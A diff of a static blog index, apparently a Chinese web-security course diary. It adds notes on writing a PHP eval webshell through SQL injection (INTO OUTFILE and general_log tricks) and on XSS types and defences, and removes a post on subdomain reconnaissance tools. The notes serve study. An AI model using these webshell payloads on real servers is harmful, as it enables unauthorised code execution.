@@ -69,6 +69,87 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-day26_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/12/16/day26_kls/" class="article-date">
+  <time class="dt-published" datetime="2024-12-16T14:42:19.000Z" itemprop="datePublished">2024-12-16</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/12/16/day26_kls/">day26_kls</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2><span id="课程内容">课程内容</span></h2><h3><span id="sql注入写webshell">sql注入写webshell</span></h3><p>写文件</p>
+<p><code>SELECT &#39;&lt;!--?php @eval($_POST[&quot;cmd&quot;]); ?--&gt;&#39; INTO OUTFILE &#39;/var/www/html/shell.php&#39;;</code></p>
+<p>利用条件</p>
+<p>secure-file-priv为空或为能够访问到的目录</p>
+<h3><span id="sql注入日志写webshell">sql注入日志写webshell</span></h3><p>开启mysql日志记录</p>
+<p><code>set GLOBAL general_log = on;</code></p>
+<p>修改mysql的基础日志文件保存位置&#x2F;var&#x2F;www&#x2F;html&#x2F;xxxx.php</p>
+<p><code>set GLOBAL general_log_file = &quot;/var/www/html/6666.php&quot;;</code></p>
+<h3><span id="xss">xss</span></h3><p>分类</p>
+<p>反射型</p>
+<p>存储型</p>
+<p>dom型</p>
+<p>xxe</p>
+<p>原因</p>
+<p>后端未经严格验证导致用户可控的输入传给前端，造成输入被解析为js</p>
+<p>危害</p>
+<p>窃取用户敏感信息</p>
+<p>劫持浏览器</p>
+<p>记录用户输入</p>
+<p>挖掘</p>
+<p>白盒</p>
+<p>黑盒</p>
+<p>bp一顿扫</p>
+<p>利用</p>
+<p>反射型</p>
+<p>通过短链接的方式让用户执行恶意script</p>
+<p>存储型</p>
+<p>等待被害者上钩</p>
+<p>dom型</p>
+<p>同反射型</p>
+<p>常用payload</p>
+<p><code>![](xxx)</code></p>
+<p>防御</p>
+<p>上waf</p>
+<p>前端过滤</p>
+<p>后端过滤</p>
+<p>绕过防御</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/12/16/day26_kls/" data-id="cm6z08oqm0015y1iw1yen71jz" data-title="day26_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-day25_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/12/14/day25_kls/" class="article-date">
@@ -749,75 +830,6 @@
 
 
   
-    <article id="post-day18_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/12/04/day18_kls/" class="article-date">
-  <time class="dt-published" datetime="2024-12-04T13:19:29.000Z" itemprop="datePublished">2024-12-04</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/04/day18_kls/">day18_kls</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2><span id="课程内容">课程内容</span></h2><h3><span id="网站架构之前后端分离">网站架构之前后端分离</span></h3><p>前后端分离是现在开发一个站点站常用的方式，为了兼容app，小程序，大家采用前后端分离的模式来开发网站。</p>
-<p>如何区分是否为前后端分离1.0：</p>
-<p>查看网页源码，如果源码内容为真实显示的数据，则为前后端不分离。更准确的方法是，你的每一个操作，网站都会返回给你一个确定的网页。当然前提是这个站点是非静态的。</p>
-<h3><span id="前端">前端</span></h3><p>html+css+js</p>
-<h3><span id="后端语言">后端语言</span></h3><p>java、python、php等等</p>
-<h3><span id="前后端分离20">前后端分离2.0</span></h3><p>为了解决js加载慢，网络爬虫无法正确爬取内容的问题。前后端分离2.0出现了。</p>
-<p>前后端分离2.0在前端与后端之间添加了一个node前端服务器(实质上还是后端)。</p>
-<h3><span id="信息收集">信息收集</span></h3><h4><span id="域名信息收集">域名信息收集</span></h4><p>ICP备案</p>
-<p>whois查询</p>
-<h4><span id="子域名收集">子域名收集</span></h4><h5><span id="工具">工具</span></h5><p>子域名挖掘机(内置字典，仅win可用)</p>
-<p><strong>ksubdomain</strong></p>
-<p>安装： <code>yay -S ksubdomain</code></p>
-<h5><span id="在线查询">在线查询</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://developers.facebook.com/tools/ct/search</span><br><span class="line">https://crt.sh</span><br></pre></td></tr></table></figure>
-
-<h5><span id="搜索引擎">搜索引擎</span></h5><p>google、baidu、bing等</p>
-<h5><span id="网络空间测绘引擎">网络空间测绘引擎</span></h5><p>shodan</p>
-<p>fofa</p>
-<p>hunter</p>
-<p>钟馗之眼</p>
-<h5><span id="其他工具">其他工具</span></h5><p><strong>oneforall</strong></p>
-<p><strong>安装</strong>：</p>
-<p><code>pip install -r requests.txt</code></p>
-<p><strong>构建docker镜像</strong></p>
-<p><code>docker build -t onforall:latest .</code></p>
-<p><strong>构建镜像报错</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tep 1/15 : FROM --platform=$TARGETPLATFORM python:3.8-alpine3.10</span><br><span class="line">failed to parse platform : &quot;&quot; is an invalid OS component of &quot;&quot;: OSAndVersion specifier component must match &quot;^([A-Za-z0-9_-]+)(?:\\(([A-Za-z0-9_.-]*)\\))?$&quot;: invalid argument</span><br></pre></td></tr></table></figure>
-
-<p>你需要安装<code>docker-buildx</code></p>
-<p><strong>运行</strong></p>
-<h2><span id="这里映射了两个数据卷一个是config另一个是result1docker-run-v-realpath-~toolsoneforallconfigoneforallconfig-v-realpath-~toolsoneforallresultoneforallresult-rm-oneforall45-target-xxxcom-run">这里映射了两个数据卷，一个是config另一个是result<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v `realpath ~/tools/OneForAll/config`:/OneForAll/config -v `realpath ~/tools/OneForAll/result`:/OneForAll/result --rm oneforall:4.5 --target xxx.com run</span><br></pre></td></tr></table></figure></span></h2>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/04/day18_kls/" data-id="cm6z08oqe000ly1iw53xwh367" data-title="day18_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AB%99%E7%82%B9%E6%9E%B6%E6%9E%84/" rel="tag">站点架构</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -862,7 +874,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/03/">March 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li></ul>
     </div>
   </div>
 
@@ -873,6 +885,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2025/03/01/weekn_kls_exam/">weekn_kls_exam</a>
+          </li>
         
           <li>
             <a href="/2025/02/11/linux%E4%B8%8B%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85/">linux下微信小程序抓包</a>
@@ -888,10 +904,6 @@
         
           <li>
             <a href="/2025/01/28/s2-013%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">s2-013命令执行</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/26/s2-009%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">s2-009命令执行</a>
           </li>
         
       </ul>
